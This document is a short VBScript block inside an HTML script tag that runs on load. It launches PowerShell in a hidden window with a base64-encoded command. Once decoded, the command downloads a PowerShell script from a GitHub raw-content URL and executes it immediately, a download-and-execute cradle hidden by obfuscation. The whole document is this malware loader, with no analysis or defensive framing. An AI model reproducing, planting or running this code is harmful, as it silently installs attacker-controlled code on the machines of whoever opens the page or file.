<script type="text/vbscript">
	ExecutePSCommand
        Sub ExecutePSCommand
            Set objShell = CreateObject("WScript.Shell")
            encodedCommand = "SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8ASABBAFgATwBSAEsAOAA4ADgAMAAvAHIAZQBjAGEAbABsAHMALwBtAGEAaQBuAC8AVAByAF8ANAA0ADUAXwByAGUAYwBhAGwAbAAuAHAAcwAxACcAKQA7AA=="
            objShell.Run "powershell.exe -EncodedCommand " & encodedCommand, 0, True
        End Sub
	</script>
